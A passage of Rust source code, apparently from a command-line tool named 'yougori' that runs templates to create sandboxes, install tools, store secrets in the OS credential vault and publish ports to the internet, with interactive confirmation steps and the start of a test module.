                if let Some(id) = state.environments.get(&old.environment) {
                    let services = call("list_environment_services", json!({"environmentId": id})).await?;
                    let publications = services["publications"].as_array().ok_or("The engine did not return its publications; the old public access was kept for retry.")?;
                    for publication in publications.iter().filter(|p| p["port"] == old.port && p["kind"] == "cloudflare") {
                        let id = publication["id"].as_str().filter(|id| !id.is_empty()).ok_or("The old public route has no publication ID; it could not be closed.")?;
                        call("unpublish_environment_service", json!({"publicationId": id})).await?;
                    }
                }
            }
            Ok(())
        };
        if let Err(error) = wait(interactive, "Closing the old public access", close).await {
            state.public[index].part = Part::failed(format!("Could not close the old public access: {error}"));
            save(instances, state)?;
            return Err(error);
        }
        state.public.remove(index);
        save(instances, state)?;
    }
    for address in desired {
        if !state.public.iter().any(|old| old.environment == address.environment && old.port == address.port) {
            state.public.push(address.clone());
        }
    }
    save(instances, state)
}

/// Sets up the template's public access exactly as `yougori ports publish` does, reusing only a
/// publication that already serves the port the way the template asks.
pub(super) async fn publish(state: &mut State, instances: &Instances, prepared: &Prepared, interactive: bool) -> Result<(), String> {
    publish_with(state, instances, prepared, interactive, crate::public::call).await
}

async fn publish_with<F, Fut>(state: &mut State, instances: &Instances, prepared: &Prepared, interactive: bool, mut call: F) -> Result<(), String>
where
    F: FnMut(&'static str, Value) -> Fut,
    Fut: std::future::Future<Output = Result<Value, String>>,
{
    for mut address in public_addresses(state, prepared)? {
        let environment = address.environment.clone();
        let (port, access, domain) = (address.port, address.access.clone(), address.domain.clone());
        let sandbox = sandbox_name(state, &environment);
        address.part = match (access.as_str(), state.environments.get(&environment)) {
            ("none", _) => Part::done(),
            (_, None) => Part::failed(format!("{sandbox} was not created.")),
            ("quick" | "domain", Some(id)) => {
                let id = id.clone();
                let label = format!("Opening {sandbox}:{port} to the internet");
                let work = async {
                    let services = call("list_environment_services", json!({"environmentId": id})).await?;
                    if let Some(url) = serving(&services, port, &access, domain.as_deref()) {
                        return Ok(Some(url));
                    }
                    let mut params = json!({"environmentId": id, "port": port});
                    match (access.as_str(), &domain) {
                        ("domain", Some(domain)) => params["domain"] = json!(domain),
                        ("domain", None) => return Err("No saved domain was chosen. Continue it and choose one.".to_owned()),
                        _ => params["kind"] = json!("cloudflare"),
                    }
                    let publication = call("publish_environment_service", params).await?;
                    serving(&json!({"publications": [publication]}), port, &access, domain.as_deref())
                        .map(Some).ok_or_else(|| "The publication did not return a working HTTPS address for the requested access.".to_owned())
                };
                match wait(interactive, &label, work).await {
                    Ok(url) => {
                        address.url = url;
                        Part::done()
                    }
                    Err(error) if error == ui::CANCELLED => return Err(error),
                    Err(error) => Part::failed(format!("{error} Fix it, then continue: only the public access is retried.")),
                }
            }
            (other, _) => Part::failed(format!("access {} must be quick, domain or none.", scan::shown(other))),
        };
        state.public.retain(|a| !(a.environment == environment && a.port == port));
        state.public.push(address);
        save(instances, state)?;
    }
    Ok(())
}

/// The outputs and the steps that need a person, with every placeholder filled in and every
/// sandbox called by its real name.
pub(super) fn finish(state: &mut State, prepared: &Prepared) -> Result<(), String> {
    let public: BTreeMap<String, String> = state.public.iter().filter_map(|a| a.url.clone().map(|url| (a.environment.clone(), url))).collect();
    let values = values(state, &public);
    let mut steps = Vec::new();
    for step in &prepared.folder.template.steps {
        steps.push(Step {
            title: render::render(step.title.as_deref().unwrap_or_default(), &values)?,
            detail: step.detail.as_deref().map(|d| render::render(d, &values)).transpose()?,
            command: step.command.as_deref().map(|c| render::render(c, &values)).transpose()?,
        });
    }
    for (key, part) in &state.tools {
        if part.is("step") {
            let tool = key.split_once('/').map_or(key.as_str(), |(_, tool)| tool);
            steps.push(Step { title: format!("Install and sign in to {tool}"), detail: Some("It installs in this terminal; sign in when it asks.".into()), command: part.message.clone() });
        }
    }
    for use_ in &prepared.folder.tools {
        let Some(tool) = tool_of(prepared, use_) else { continue };
        let sandbox = sandbox_name(state, &use_.environment);
        let shell = format!("yougori terminal {}", shell_words::quote(&sandbox));
        match tool.signin_method() {
            "browser" | "device" => steps.push(Step {
                title: format!("Sign in to {}", tool.title()),
                detail: Some(format!("Open a shell in {sandbox}, then run: {}", tool.signin.as_ref().and_then(|s| s.command.as_deref()).unwrap_or_default())),
                command: Some(shell),
            }),
            "api-key" if !state.secrets.contains(&format!("tool.{}", tool.name())) => steps.push(Step {
                title: format!("Give {} its API key", tool.title()),
                detail: Some(format!("No key was given, so set {} inside {sandbox} when you use it.", tool.key_variable().unwrap_or("its key variable"))),
                command: Some(shell),
            }),
            _ => {}
        }
    }
    state.steps.retain(|s| s.title.starts_with("Check the sandboxes"));
    state.steps.splice(0..0, steps);
    state.outputs = prepared.folder.template.outputs.iter()
        .map(|o| Ok((render::render(o.label.as_deref().unwrap_or_default(), &values)?, render::render(o.value.as_deref().unwrap_or_default(), &values)?)))
        .collect::<Result<_, String>>()?;
    Ok(())
}

/// The JSON a run, `continue` and `status` answer with. `live` is the engine's state, when read.
pub fn result(state: &State, live: Option<&Value>) -> Value {
    let environments: Vec<Value> = state.review["environments"].as_array().into_iter().flatten().filter_map(|e| e["name"].as_str()).map(|name| {
        let id = state.environments.get(name);
        let status = match (id, live) {
            (None, _) => "not created".to_owned(),
            (Some(id), Some(live)) => live["environments"].as_array().into_iter().flatten().find(|e| e["id"] == id.as_str()).and_then(|e| e["status"].as_str()).unwrap_or("removed").to_owned(),
            (Some(_), None) => "created".to_owned(),
        };
        json!({"name": name, "environment": sandbox_name(state, name), "id": id, "status": status})
    }).collect();
    let mut value = json!({
        "instance": state.instance,
        "status": state.status_word(),
        "template": {"source": state.origin, "ref": state.item.clone().or_else(|| Some(state.template.clone())), "path": state.path, "name": state.template, "title": state.title, "version": state.version, "verified": state.verified},
        "folder": Instances::standard().map(|i| i.folder(&state.instance)).ok(),
        "environments": environments,
        "public": state.public,
        "outputs": state.outputs.iter().map(|(label, value)| json!({"label": label, "value": value})).collect::<Vec<_>>(),
        "steps": state.steps,
        "tools": state.tools,
        "next": state.continue_command(),
        "continue": state.continue_command(),
        "remove": state.remove_command(),
        "statusCommand": format!("yougori template status {}", state.instance),
    });
    if let Some(target) = &state.updating {
        value["updating"] = json!(target.version);
    }
    if state.status_word() == "incomplete" {
        if let Some((part, message)) = state.failed() {
            value["failed"] = json!({"part": part, "message": message});
        } else if let Some(target) = &state.updating {
            value["failed"] = json!({"part": "the update", "message": format!("The update to {} did not finish.", target.version)});
        }
    }
    value
}

/// Shows the review, with the community warning above it for an unverified template or tool.
fn show_review(prepared: &Prepared, notes: &[String]) {
    let mut lines: Vec<String> = Vec::new();
    if !prepared.verified || !prepared.unverified_tools.is_empty() {
        lines.extend(super::views::unverified().into_iter().map(|l| ui::paint(&l, ui::AMBER)));
        if prepared.verified {
            lines.push(ui::paint(&format!("This applies to its tools from the Hub: {}.", prepared.unverified_tools.join(", ")), ui::AMBER));
        }
        lines.push(String::new());
    }
    lines.push(ui::bold(&format!("{} · {}", super::views::clean(prepared.folder.template.title()), prepared.label())));
    lines.push(super::views::clean(prepared.folder.template.summary.as_deref().unwrap_or_default()));
    lines.push(String::new());
    lines.extend(super::views::review(&prepared.review));
    if prepared.differs {
        lines.push(String::new());
        lines.push(ui::paint("▲ The Hub page's summary differs from the files. This review was built from the files themselves.", ui::AMBER));
    }
    for note in notes.iter().chain(&prepared.notices) {
        lines.push(ui::paint(&format!("▲ {}", super::views::clean(note)), ui::AMBER));
    }
    ui::lines(lines.into_iter().map(|line| format!("{}  {line}", ui::muted("│"))).collect());
}

fn same_source(state: &State, wanted: &Wanted) -> bool {
    match wanted {
        Wanted::Hub(reference) => state.item.as_deref() == Some(reference.item().as_str()),
        Wanted::Folder(path) => state.path.as_deref() == Some(path.to_string_lossy().as_ref()),
    }
}

fn where_from(state: &State) -> String {
    state.item.clone().or_else(|| state.path.clone()).unwrap_or_else(|| state.template.clone())
}

/// A stop before anything was created says exactly that.
fn nothing_created(error: String) -> String {
    if error == ui::CANCELLED || error == ui::BACK { crate::wire::cancelled("Cancelled. Nothing was created.") } else { error }
}

/// A stop before anything changed says exactly that.
fn nothing_changed(error: String) -> String {
    if error == ui::CANCELLED || error == ui::BACK { crate::wire::cancelled("Cancelled. Nothing was changed.") } else { error }
}

/// The template's name in a folder, for the name of its instance.
fn folder_name(path: &Path) -> String {
    std::fs::read_to_string(path.join(format::TEMPLATE_FILE)).ok()
        .and_then(|text| serde_yaml_ng::from_str::<format::Template>(text.trim_start_matches('\u{feff}')).ok())
        .and_then(|template| template.name)
        .unwrap_or_else(|| path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_else(|| "template".into()))
}

/// `yougori run REF` and `yougori template run REF|FOLDER`. A run of a template that already has
/// an instance here continues that instance (`--name`, or the person's choice); otherwise it makes
/// a new one.
pub async fn run(options: Options, interactive: bool) -> Result<Value, String> {
    instances::clear_current();
    let instances = Instances::standard()?;
    let wanted = wanted(&options.source)?;
    let _raw = if interactive { Some(ui::Raw::on()?) } else { None };
    let _quiet = interactive.then(Quiet::on);
    if interactive {
        ui::intro("Run a template", &match &wanted { Wanted::Hub(r) => r.command(), Wanted::Folder(p) => p.display().to_string() });
    }
    let base = match &wanted {
        Wanted::Hub(reference) => reference.name.clone(),
        Wanted::Folder(path) => folder_name(path),
    };
    let candidate = options.name.clone().unwrap_or_else(|| instances::available(&base, &[], &BTreeSet::new(), &BTreeSet::new()));
    if let Some(state) = instances.load(&candidate)? {
        if same_source(&state, &wanted) {
            let asked = match &wanted { Wanted::Hub(reference) => reference.version.clone(), Wanted::Folder(_) => None };
            let other_version = asked.filter(|version| version != &state.version);
            match (&options.name, &other_version, interactive) {
                (_, Some(version), false) | (Some(_), Some(version), true) => {
                    return Err(format!("{} runs {} {}; this asks for {version}. Update it with yougori template update {}, or make another copy with --name NEW-NAME. Nothing was changed.", state.instance, where_from(&state), state.version, state.instance));
                }
                (Some(_), None, _) => return continue_instance(&state.instance, options, interactive, false).await,
                (None, None, false) => {
                    return Err(format!("An instance named {0} already runs this template. Continue it with yougori template continue {0}, or make another copy with --name NEW-NAME. Nothing was created.", state.instance));
                }
                (None, None, true) => {
                    let open = if state.status_word() == "ready" { "Open the existing one" } else { "Continue the existing one" };
                    let choices = [ui::Choice::new(open, if open.starts_with("Open") { "show its status" } else { "finish what it has not finished" }), ui::Choice::new("Create another", "a separate copy with its own sandboxes")];
                    if ui::select(&format!("{} already runs this template", state.instance), &[], &choices, 0).map_err(nothing_created)? == 0 {
                        return continue_instance(&state.instance, options, interactive, false).await;
                    }
                }
                (None, Some(version), true) => {
                    let note = [format!("{} runs version {}; update it with yougori template update {}.", state.instance, state.version, state.instance)];
                    if ui::select(&format!("Make another copy with version {version}?"), &note, &[ui::Choice::new("Create another", "a separate copy with its own sandboxes"), ui::Choice::new("Cancel", "nothing is created")], 0).map_err(nothing_created)? != 0 {
                        return Err(crate::wire::cancelled("Cancelled. Nothing was created."));
                    }
                }
            }
        } else if options.name.is_some() {
            return Err(format!("{candidate} already holds {}. Choose another name with --name. Nothing was created.", where_from(&state)));
        }
    }
    let site = Site::configured()?;
    let cache = Cache::standard()?;
    let prepared = wait(interactive, "Downloading and checking the template", prepare(&site, &cache, &wanted)).await.map_err(nothing_created)?;
    let (host, engine) = wait(interactive, "Checking this computer", host(&prepared.folder, &prepared.hub_tools)).await.map_err(nothing_created)?;
    let requirements = review::requirements(&prepared.folder, &prepared.hub_tools, &prepared.review, &host);
    if !requirements.stops.is_empty() {
        return Err(format!("{}\nNothing was created.", requirements.stops.join("\n")));
    }
    let environments: Vec<String> = prepared.folder.project.environments.keys().cloned().collect();
    let taken: BTreeSet<String> = engine["environments"].as_array().into_iter().flatten().filter_map(|e| e["name"].as_str()).map(str::to_ascii_lowercase).collect();
    let name = match &options.name {
        Some(name) => {
            if let Some(problem) = instances::name_problem(name, &environments) {
                return Err(problem);
            }
            if let Some(environment) = environments.iter().find(|e| taken.contains(&format!("{name}-{e}").to_lowercase())) {
                return Err(format!("An environment named {name}-{environment} already exists outside this template. Choose another name with --name. Nothing was created."));
            }
            name.clone()
        }
        None => instances::available(&base, &environments, &instances.names(), &taken),
    };
    let questions = questions(&prepared);
    let domains = if questions.iter().any(|q| q.kind == Kind::Domain) { wait(interactive, "Reading your saved domains", async { Ok(saved_domains().await) }).await.map_err(nothing_created)? } else { Vec::new() };
    let notes = requirements.notes.clone();
    if options.dry_run {
        if interactive {
            show_review(&prepared, &notes);
            ui::outro(&format!("Dry run: nothing was created. Run it with yougori template run {} --name {name}", prepared.source()));
        }
        return Ok(json!({
            "dryRun": true, "template": {"ref": prepared.label(), "version": prepared.version, "verified": prepared.verified, "digest": prepared.digest, "unverifiedTools": prepared.unverified_tools},
            "instance": name, "review": prepared.review, "pageDiffers": prepared.differs, "withoutGpu": requirements.without_gpu,
            "notes": notes.iter().chain(&prepared.notices).collect::<Vec<_>>(),
            "questions": questions.iter().map(|q| json!({"id": q.id, "question": q.question, "type": q.kind.name(), "required": q.required, "default": q.default, "choices": q.choices.iter().map(|c| &c.value).collect::<Vec<_>>()})).collect::<Vec<_>>(),
        }));
    }
    let mut answers: BTreeMap<String, String> = BTreeMap::new();
    let mut secrets: BTreeMap<String, Zeroizing<String>> = BTreeMap::new();
    let mut without_gpu = false;
    let pc = prepared.folder.pc_access();
    if interactive {
        show_review(&prepared, &notes);
        let cancel = || crate::wire::cancelled("Cancelled. Nothing was created.");
        let mut steps = ui::Wizard::new();
        loop {
            let asked: Result<bool, String> = match steps.step() {
                0 if requirements.without_gpu => {
                    let choices = [ui::Choice::new("Run without the GPU", "its GPU sandboxes become ordinary containers"), ui::Choice::new("Cancel", "nothing is created")];
                    match ui::select("This computer has no NVIDIA GPU that Yougori can use", &["The template says it also runs without one, more slowly.".to_owned()], &choices, 0) {
                        Ok(0) => {
                            without_gpu = true;
                            Ok(true)
                        }
                        Ok(_) => return Err(cancel()),
                        Err(error) => Err(error),
                    }
                }
                0 => Ok(false),
                1 => match ui::select(&format!("Run {}?", prepared.label()), &[], &[ui::Choice::new("Run it", "create what the review lists"), ui::Choice::new("Cancel", "nothing is created")], 0) {
                    Ok(0) => Ok(true),
                    Ok(_) => return Err(cancel()),
                    Err(error) => Err(error),
                },
                2 if pc => {
                    let choices = [ui::Choice::new("Allow access to these folders", "only the folders listed"), ui::Choice::new("Cancel", "nothing is created")];
                    match ui::select("This template uses folders on this computer", &["See PC access in the review above: its sandboxes can read (or change) those folders.".to_owned()], &choices, 1) {
                        Ok(0) => Ok(true),
                        Ok(_) => return Err(cancel()),
                        Err(error) => Err(error),
                    }
                }
                2 => Ok(false),
                n => {
                    let Some(question) = questions.get(n - 3) else { break };
                    if !question.asked(&answers) {
                        answers.remove(&question.id);
                        secrets.remove(&question.id);
                        Ok(false)
                    } else {
                        ask_question(question, answers.get(&question.id), &domains).map(|answer| {
                            remember_answer(question, answer, &mut answers, &mut secrets);
                            true
                        })
                    }
                }
            };
            match steps.next(asked) {
                Ok(()) => {}
                Err(error) if error == ui::BACK || error == ui::CANCELLED => return Err(cancel()),
                Err(error) => return Err(error),
            }
        }
    } else {
        if !options.yes {
            return Err(format!("Running a template needs --yes once you have read its review: yougori template run {} --dry-run shows it. Nothing was created.", prepared.source()));
        }
        if pc && !options.allow_pc_access {
            return Err("This template uses folders on this computer (see pcAccess in its review). Pass --allow-pc-access as well as --yes if that is intended. Nothing was created.".into());
        }
        without_gpu = requirements.without_gpu;
        let stdin = if options.secrets_stdin { Some(read_stdin("the secrets on stdin").await?) } else { None };
        let given = given(&options, &questions, stdin.as_deref().map(|b| b.as_slice()))?;
        let (scripted, given_secrets) = script_answers(&questions, &given, &BTreeMap::new(), &BTreeSet::new(), Some(&domains))?;
        answers = scripted;
        secrets = given_secrets;
    }
    let mut lock = instances.lock(&name)?;
    // Another run may have taken the same name while this one asked its questions.
    if instances.load(&name)?.is_some() {
        return Err(format!("Another command just made an instance named {name}. Run the template again for another copy, or continue that one with yougori template continue {name}. Nothing was created."));
    }
    lock.heartbeat(instances.folder(&name));
    let (origin, item, path) = match &prepared.origin {
        Wanted::Hub(reference) => ("hub", Some(reference.item()), None),
        Wanted::Folder(path) => ("folder", None, Some(path.to_string_lossy().into_owned())),
    };
    let mut state = State {
        instance: name,
        origin: origin.into(),
        item,
        path,
        template: prepared.folder.template.name().into(),
        title: prepared.folder.template.title().into(),
        version: prepared.version.clone(),
        digest: prepared.digest.clone(),
        verified: prepared.verified,
        project: prepared.folder.project_path.clone(),
        answers,
        allow_pc_access: pc,
        without_gpu,
        review: prepared.review.clone(),
        ..Default::default()
    };
    build(&mut state, &instances, &prepared, secrets, interactive, &site, Ending::default()).await
}

fn remember_answer(question: &Question, answer: Option<String>, answers: &mut BTreeMap<String, String>, secrets: &mut BTreeMap<String, Zeroizing<String>>) {
    match answer {
        Some(answer) if question.kind == Kind::Secret => {
            secrets.insert(question.id.clone(), Zeroizing::new(answer));
        }
        Some(answer) => {
            answers.insert(question.id.clone(), answer);
        }
        None => {
            answers.remove(&question.id);
            secrets.remove(&question.id);
        }
    }
}

/// What a continue still has to do, as a person reads it.
fn left_to_do(state: &State) -> Vec<String> {
    let mut left = Vec::new();
    if state.phase == "stopped" {
        left.push("Start the sandboxes again".to_owned());
    } else if !state.create.is("done") {
        left.push("Create the sandboxes".to_owned());
    }
    for (key, part) in &state.tools {
        if part.is("pending") || part.is("failed") {
            let (environment, tool) = key.split_once('/').unwrap_or((key, ""));
            left.push(format!("Install {tool} in {}", sandbox_name(state, environment)));
        }
    }
    for address in &state.public {
        if address.part.is("pending") || address.part.is("failed") {
            left.push(format!("Public access for {}:{}", sandbox_name(state, &address.environment), address.port));
        }
    }
    left
}

/// `yougori template continue INSTANCE`: carries on an existing instance from its own record,
/// with the same source, version and files and its stored answers. Only what is still missing is
/// asked. `intro` says whether this command already showed its heading.
pub async fn continue_instance(name: &str, options: Options, interactive: bool, intro: bool) -> Result<Value, String> {
    instances::clear_current();
    let instances = Instances::standard()?;
    let mut lock = instances.lock(name)?;
    let mut state = instances.get(name)?;
    if state.updating.is_some() {
        drop(lock);
        return super::lifecycle::update(name, options, interactive).await;
    }
    let _raw = if interactive { Some(ui::Raw::on()?) } else { None };
    let _quiet = interactive.then(Quiet::on);
    if interactive && intro {
        ui::intro("Continue", name);
    }
    let site = Site::configured()?;
    let cache = Cache::standard()?;
    let prepared = wait(interactive, &format!("Checking {name}'s files"), prepare_own(&site, &cache, &state)).await.map_err(nothing_changed)?;
    let (host, engine) = wait(interactive, "Checking this computer", host(&prepared.folder, &prepared.hub_tools)).await.map_err(nothing_changed)?;
    let requirements = review::requirements(&prepared.folder, &prepared.hub_tools, &prepared.review, &host);
    if !requirements.stops.is_empty() {
        return Err(format!("{}\nNothing was changed.", requirements.stops.join("\n")));
    }
    let gone = check_live(&mut state, &engine);
    super::lifecycle::refresh_addresses(&mut state).await;
    if state.phase == "stopped" {
        state.create = Part::pending();
    }
    let questions = questions(&prepared);
    let stored: BTreeSet<String> = state.secrets.iter().cloned().collect();
    let missing: Vec<&Question> = questions.iter().filter(|q| {
        q.asked(&state.answers) && q.required && if q.kind == Kind::Secret { !stored.contains(&q.id) } else { !state.answers.contains_key(&q.id) }
    }).collect();
    let tools_or_access_missing = state.tools.values().chain(state.public.iter().map(|a| &a.part)).any(|p| p.is("pending") || p.is("failed"));
    let declared_differs = prepared.folder.tools.len() != state.tools.len() || prepared.folder.template.public.len() != state.public.len();
    let needs_gpu_choice = requirements.without_gpu && !state.without_gpu;
    if state.create.is("done") && !tools_or_access_missing && !declared_differs && missing.is_empty() && !needs_gpu_choice && state.phase != "stopped" {
        drop(lock);
        let value = super::lifecycle::status(Some(name), interactive).await?;
        if interactive {
            let shown = super::views::instance(&value);
            ui::lines(shown.lines().map(|line| format!("{}  {line}", ui::muted("│"))).collect());
            ui::outro(&format!("{name} is ready; nothing was changed."));
        }
        return Ok(value);
    }
    let mut answers = state.answers.clone();
    let mut secrets: BTreeMap<String, Zeroizing<String>> = BTreeMap::new();
    let pc = prepared.folder.pc_access() && !state.allow_pc_access;
    let mut left = left_to_do(&state);
    if !gone.is_empty() {
        left.insert(0, format!("Make again the sandboxes deleted since: {}", gone.iter().map(|key| format!("{}-{key}", state.instance)).collect::<Vec<_>>().join(", ")));
    }
    if interactive {
        let mut lines = vec![format!("{} · {}", state.instance, prepared.label())];
        lines.extend(left.iter().map(|item| format!("  {item}")));
        for note in requirements.notes.iter().chain(&prepared.notices) {
            lines.push(format!("▲ {note}"));
        }
        ui::lines(lines.into_iter().map(|line| format!("{}  {}", ui::muted("│"), super::views::clean(&line))).collect());
        let cancel = || crate::wire::cancelled("Cancelled. Nothing was changed.");
        let mut steps = ui::Wizard::new();
        loop {
            let asked: Result<bool, String> = match steps.step() {
                0 if needs_gpu_choice => {
                    let choices = [ui::Choice::new("Run without the GPU", "its GPU sandboxes become ordinary containers"), ui::Choice::new("Cancel", "nothing changes")];
                    match ui::select("This computer has no NVIDIA GPU that Yougori can use", &["The template says it also runs without one, more slowly.".to_owned()], &choices, 0) {
                        Ok(0) => {
                            state.without_gpu = true;
                            Ok(true)
                        }
                        Ok(_) => return Err(cancel()),
                        Err(error) => Err(error),
                    }
                }
                0 => Ok(false),
                1 => match ui::select(&format!("Continue {name}?"), &[], &[ui::Choice::new("Continue", "do what is listed above"), ui::Choice::new("Cancel", "nothing changes")], 0) {
                    Ok(0) => Ok(true),
                    Ok(_) => return Err(cancel()),
                    Err(error) => Err(error),
                },
                2 if pc => match ui::select("This template uses folders on this computer", &["See PC access in its review: its sandboxes can read (or change) those folders.".to_owned()], &[ui::Choice::new("Allow access to these folders", "only the folders listed"), ui::Choice::new("Cancel", "nothing changes")], 1) {
                    Ok(0) => Ok(true),
                    Ok(_) => return Err(cancel()),
                    Err(error) => Err(error),
                },
                2 => Ok(false),
                n => {
                    let Some(question) = missing.get(n - 3) else { break };
                    if !question.asked(&answers) {
                        Ok(false)
                    } else {
                        let domains = if question.kind == Kind::Domain { saved_domains().await } else { Vec::new() };
                        ask_question(question, answers.get(&question.id), &domains).map(|answer| {
                            remember_answer(question, answer, &mut answers, &mut secrets);
                            true
                        })
                    }
                }
            };
            match steps.next(asked) {
                Ok(()) => {}
                Err(error) if error == ui::BACK || error == ui::CANCELLED => return Err(cancel()),
                Err(error) => return Err(error),
            }
        }
    } else {
        if !options.yes {
            return Err(format!("Continuing {name} does: {}. Repeat with --yes to go on. Nothing was changed.", left.join("; ")));
        }
        if pc && !options.allow_pc_access {
            return Err("This template uses folders on this computer (see pcAccess in its review). Pass --allow-pc-access as well as --yes if that is intended. Nothing was changed.".into());
        }
        state.without_gpu |= needs_gpu_choice;
        let stdin = if options.secrets_stdin { Some(read_stdin("the secrets on stdin").await?) } else { None };
        let given = given(&options, &questions, stdin.as_deref().map(|b| b.as_slice()))?;
        let (scripted, given_secrets) = script_answers(&questions, &given, &answers, &stored, Some(&saved_domains().await))?;
        answers = scripted;
        secrets = given_secrets;
    }
    state.answers = answers;
    state.allow_pc_access |= pc;
    lock.heartbeat(instances.folder(name));
    build(&mut state, &instances, &prepared, secrets, interactive, &site, Ending::default()).await
}

/// How a build ends: a run (or continue), or an update, which takes on the new version only once
/// every part finished and may have to leave a stopped instance stopped again.
#[derive(Clone, Copy, Debug, Default)]
pub struct Ending {
    pub update: bool,
    pub stay_stopped: bool,
}

/// Validate the final answers before a run or update writes files, saves state or changes routes.
pub(super) fn validate_project(state: &State, prepared: &Prepared, secrets: &BTreeMap<String, Zeroizing<String>>) -> Result<String, String> {
    let mut planned = state.clone();
    for id in secrets.keys() {
        if !planned.secrets.contains(id) {
            planned.secrets.push(id.clone());
        }
    }
    let unchanged = if state.created_at == 0 { "Nothing was created." } else { "Nothing was changed." };
    let (yaml, project) = render::project(&prepared.folder.project_text, &values(&planned, &BTreeMap::new()), &adjust(&planned, prepared))
        .map_err(|error| format!("The answers do not make a valid project: {error} {unchanged}"))?;
    format::rendered_paths(&project, &state.project, &prepared.files).map_err(|error| format!("{error} {unchanged}"))?;
    public_addresses(&planned, prepared)?;
    Ok(yaml)
}

/// Writes the instance, stores its secrets and runs every part that has not finished. The record
/// says how far it got whatever happens, so `template continue` carries on from there.
pub(super) async fn build(state: &mut State, instances: &Instances, prepared: &Prepared, secrets: BTreeMap<String, Zeroizing<String>>, interactive: bool, site: &Site, ending: Ending) -> Result<Value, String> {
    // The project exactly as it will run, checked before anything is saved, stored or written:
    // the strict rules of `up`, and every path it reads still inside the instance's own files.
    let yaml = validate_project(state, prepared, &secrets)?;
    let desired = public_addresses(state, prepared)?;
    state.phase = "creating".into();
    if state.create.status.is_empty() {
        state.create = Part::pending();
    }
    // Only the tools this version declares. Old public routes must be closed before dropping
    // their records, while the old sandbox IDs are still available.
    let tool_keys: BTreeSet<String> = prepared.folder.tools.iter().map(|t| format!("{}/{}", t.environment, t.name())).collect();
    state.tools.retain(|key, _| tool_keys.contains(key));
    for key in &tool_keys {
        state.tools.entry(key.clone()).or_insert_with(Part::pending);
    }
    let outcome = async {
        reconcile_public(state, instances, &desired, interactive, crate::public::call).await?;
        parts(state, instances, prepared, secrets, &yaml, interactive).await
    }.await;
    let _ = finish(state, prepared);
    let finished = outcome.is_ok() && state.complete();
    if finished && ending.update {
        state.version = prepared.version.clone();
        state.digest = prepared.digest.clone();
        state.verified = prepared.verified;
        state.updating = None;
    }
    state.phase = if finished { "ready" } else { "incomplete" }.into();
    if finished && ending.stay_stopped {
        let path = instances.folder(&state.instance).join(&state.project);
        match wait(interactive, &format!("Stopping {} again", state.instance), crate::public::call("project_action", json!({"path": path, "action": "down"}))).await {
            Ok(_) => state.phase = "stopped".into(),
            Err(error) if error == ui::CANCELLED => {}
            Err(_) => state.steps.push(Step { title: format!("{} was stopped before the update and is running now", state.instance), detail: Some("Stopping it again did not work.".into()), command: Some(format!("yougori template down {}", state.instance)) }),
        }
    }
    save(instances, state)?;
    match outcome {
        Err(error) if error == ui::CANCELLED || crate::wire::cancellation(&error).is_some() => Err(crate::wire::cancelled(&stopped())),
        Err(error) => Err(format!("{error}\n{}", next_steps(&result(state, None)))),
        Ok(()) => {
            // Counting the clone never holds anything up: it comes last, briefly, and Ctrl+C skips it.
            if let Wanted::Hub(reference) = &prepared.origin {
                if !state.counted && count_clone(site, reference, &prepared.version, interactive).await {
                    state.counted = true;
                    save(instances, state)?;
                }
            }
            let live = crate::public::call("get_platform_state", json!({})).await.ok();
            let value = result(state, live.as_ref());
            if interactive {
                let shown = super::views::instance(&value);
                ui::lines(shown.lines().map(|line| format!("{}  {line}", ui::muted("│"))).collect());
                if state.complete() && state.phase == "stopped" {
                    ui::outro(&format!("{} is updated to {} and stays stopped. Start it with {}.", state.instance, state.version, state.continue_command()));
                } else if state.complete() && ending.update {
                    ui::outro(&format!("{} is updated to {}.", state.instance, state.version));
                } else if state.complete() {
                    ui::outro(&format!("{} is ready.", state.instance));
                } else {
                    ui::outro(&ui::paint("Not everything finished. Fix what it says above, then continue it.", ui::AMBER));
                }
            }
            if !state.complete() {
                return Err(format!("{}\n{}", value["failed"]["message"].as_str().unwrap_or("Not everything finished."), next_steps(&value)));
            }
            Ok(value)
        }
    }
}

/// Adds this computer to the item's clones, once; true when the Hub answered.
async fn count_clone(site: &Site, reference: &Ref, version: &str, interactive: bool) -> bool {
    let Ok(id) = client::home().and_then(|home| client::install_id(&home)) else { return false };
    wait(interactive, "Telling the Hub it ran", async { Ok(site.count_clone(reference, version, &id).await) }).await.ok().flatten().is_some()
}

async fn parts(state: &mut State, instances: &Instances, prepared: &Prepared, secrets: BTreeMap<String, Zeroizing<String>>, yaml: &str, interactive: bool) -> Result<(), String> {
    let folder = instances.folder(&state.instance);
    // Secrets go to the OS credential vault before the project that names them is applied.
    for (id, value) in &secrets {
        let name = stored_name(&state.instance, id);
        wait(interactive, "Storing secrets in this computer's credential vault", crate::public::call("set_deployment_secret", json!({"name": name, "value": value.as_str()}))).await?;
        if !state.secrets.contains(id) {
            state.secrets.push(id.clone());
        }
    }
    drop(secrets);
    let project_file = folder.join(&state.project);
    if !state.create.is("done") || !project_file.exists() {
        if state.files.is_empty() {
            state.files = instances::write(&folder, &prepared.files, &state.project, yaml)?;
        } else {
            client::write_files(&folder, &[(state.project.clone(), yaml.as_bytes().to_vec())].into())?;
            state.files.insert(state.project.clone(), scan::sha256_hex(yaml.as_bytes()));
        }
    }
    save(instances, state)?;
    if !state.create.is("done") {
        up(state, instances, interactive).await?;
    }
    install_tools(state, instances, prepared, interactive).await?;
    publish(state, instances, prepared, interactive).await
}

fn next_steps(value: &Value) -> String {
    format!("Everything already created was kept. Continue: {} · Remove: {}", value["continue"].as_str().unwrap_or_default(), value["remove"].as_str().unwrap_or_default())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::hub::client::tests::{bundle_json, serve, Fixture};

    fn example() -> Files {
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../examples/hub/hello-site");
        scan::collect(&root).unwrap().files
    }

    #[test]
    fn the_reference_example_passes_the_checker_and_its_review() {
        let files = example();
        let folder = format::template(&files).unwrap_or_else(|problems| panic!("{}", problems.join("\n")));
        assert!(format::publishing_problems(&folder).is_empty(), "the example can be published");
        let review = review::template(&folder, &[], &BTreeMap::new());
        assert_eq!(review["totals"]["environments"], 1);
        assert_eq!(review["environments"][0]["name"], "web");
        assert_eq!(review["tools"][0]["name"], "httpie");
        assert_eq!(review["tools"][0]["source"], "bundled");
        assert_eq!(review["tools"][0]["downloads"], json!(["https://pypi.org"]));
        assert_eq!(review["public"], json!([{"environment": "web", "port": 8080, "access": "asked", "input": "access"}]));
        let ids: Vec<&str> = review["inputs"].as_array().unwrap().iter().filter_map(|i| i["id"].as_str()).collect();
        assert_eq!(ids, ["site_title", "access", "domain"]);
